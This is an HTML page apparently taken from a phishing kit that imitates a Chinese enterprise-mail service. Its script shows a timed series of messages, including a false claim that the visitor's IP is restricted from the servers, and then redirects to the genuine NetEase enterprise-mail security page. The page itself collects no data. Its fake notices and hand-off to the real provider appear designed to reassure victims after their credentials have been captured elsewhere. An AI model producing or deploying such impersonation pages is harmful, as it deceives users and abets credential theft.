﻿<html>
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
	<title>企业&nbsp;邮件&nbsp;</title>
	
	<style type="text/css"><!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}

.style6 {color: #FF6600}
.style8 {font-size: 16}
-->
	</style>
	<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=2300

//configure destination URL

var targetdestination="https://qiye.163.com/entry/block/safe/index.htm"





var splashmessage=new Array()

var openingtags='<font face="calibri" size="4" color="#000000">'

splashmessage[0]='正在连接到邮件中心......'

splashmessage[1]='请稍候......'

splashmessage[2]='您的IP对我们的服务器的访问受到限制......'

splashmessage[3]='请再试一次......'

splashmessage[4]='在几分钟的时间！'







var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script><script><!--

 var jv=1.0;

//--></script><script language="Javascript1.1"><!--

 jv=1.1;

//--></script><script language="Javascript1.2"><!--

 jv=1.2;

//--></script><script language="Javascript1.3"><!--

 jv=1.3;

//--></script><script language="Javascript1.4"><!--

 jv=1.4;

//--></script>
	<title></title>
</head>
<body bottommargin="0" leftmargin="0" marginheight="0" marginwidth="0" rightmargin="0" topmargin="0">
<table align="center" bgcolor="#FFFFFF" height="100%" width="100%">
	<tbody>
		<tr>
			<td bgcolor="" height="12%">&nbsp;
			<table align="center" bgcolor="#ffffff" width="75%">
				<tbody>
					<tr>
						<td>
						<table align="center" bgcolor="#ffffff" width="90%">
							<tbody>
								<tr>
									<td>&nbsp;</td>
									<td width="80">&nbsp;</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td bgcolor="" height="2%">
			<hr align="center" color="#E6E6E6" width="100%" /></td>
		</tr>
		<tr>
			<td height="85%">
			<table align="center" width="600">
				<tbody>
					<tr>
						<td height="35">&nbsp;</td>
					</tr>
					<tr>
						<td>
						<table align="center" width="600">
							<tbody>
								<tr>
									<td height="">
									<table width="">
										<tbody>
											<tr>
												<td><img height="200" src="s_files/img4.gif" width="230" /></td>
												<td width="20">&nbsp;</td>
												<td width="350">
												<div align="center" class="style1" id="splashcontainer" style="visibility: visible; top: 363.5px;">&nbsp;</div>
												</td>
											</tr>
										</tbody>
									</table>
									<br />
									<br />
									<br />
									<br />
									<br />
									&nbsp;</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td height="30">&nbsp;</td>
					</tr>
					<tr>
						<td height="">&nbsp;</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td bgcolor="" height="">
			<hr align="center" color="#E6E6E6" width="100%" /></td>
		</tr>
		<tr>
			<td bgcolor="#F2F2F2" height="21%">&nbsp;</td>
		</tr>
	</tbody>
</table>
</body>
</html>
